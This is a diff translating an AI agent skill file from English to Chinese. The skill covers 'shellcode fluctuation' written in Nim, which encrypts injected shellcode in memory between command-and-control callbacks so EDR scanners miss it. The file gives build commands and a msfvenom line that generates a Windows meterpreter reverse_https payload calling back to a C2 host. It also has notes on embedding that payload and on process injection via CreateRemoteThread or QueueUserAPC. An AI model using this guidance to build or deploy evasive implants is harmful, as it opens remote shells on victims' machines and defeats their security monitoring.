@@ -1,38 +1,35 @@
 ---
 name: nim-shellcode-fluctuation
 description: >
-  This skill should be used when the user asks about
-  "nim-shellcode-fluctuation", "deploying implants that must hide from EDR
-  in-memory scanning of RWX regions". Nim port of shellcode fluctuation —
-  encrypts injected shellcode in memory between executions to evade memory
-  scanners.
+  此技能适用于用户询问关于 "nim-shellcode-fluctuation"、"部署需要在 EDR 内存扫描 RWX 区域时隐藏自身的植入物"、
+  "shellcode 内存加密规避" 的问题。
 ---
 
 # Nim Shellcode Fluctuation
 
-Memory evasion — encrypts shellcode (XOR/RC4) in RX pages between C2 callbacks.
+内存规避技术 — 在 C2 回调间隔期间对 RX 页中的 shellcode 进行 XOR/RC4 加密。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Install Nim
+# 安装 Nim
 # nimble install winim
 
-# Build
+# 编译
 nim c -d:release -d:strip --opt:size -o:agent.exe fluctuation.nim
 
-# Inject shellcode (embed in source)
-# Replace SHELLCODE placeholder in nim source with msfvenom/Cobalt output
+# 注入 shellcode（嵌入到源码中）
+# 将 nim 源码中的 SHELLCODE 占位符替换为 msfvenom/Cobalt 的输出
 ```
 
-## How It Works
+## 工作原理
 
-1. Shellcode is injected into RX memory
-2. Before sleeping: encrypt in-place (XOR/RC4), change page to RW
-3. After sleep: decrypt, change page back to RX/RWX
-4. EDR memory scans during sleep see only garbage
+1. Shellcode 被注入到 RX 内存页
+2. 睡眠前：就地加密（XOR/RC4），将页属性改为 RW
+3. 睡眠后：解密，将页属性改回 RX/RWX
+4. EDR 内存扫描在睡眠期间只会看到乱码
 
-## Core Configuration
+## 核心配置
 
 ```nim
 const SLEEP_MS = 5000       # Sleep between beacons
@@ -40,23 +37,23 @@ const XOR_KEY  = 0x41       # Encryption key byte
 const FLUCTUATE = true      # Enable/disable fluctuation
 ```
 
-## Common Workflows
+## 常见工作流
 
-**Generate shellcode and embed:**
+**生成 shellcode 并嵌入：**
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=C2 LPORT=443 -f raw -o shell.bin
-# Base64-encode and embed in nim source
+# Base64 编码后嵌入 nim 源码
 python3 -c "import base64; print(base64.b64encode(open('shell.bin','rb').read()).decode())"
 ```
 
-**Combine with process injection:**
+**结合进程注入：**
 ```nim
 # Use createRemoteThread or QueueUserAPC for injection
 # then enable fluctuation in the injected thread
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 加载时机 |
 |------|--------------|
-| `references/` | APC injection variants and EDR bypass notes |
+| `references/` | APC 注入变体和 EDR 绕过说明 |
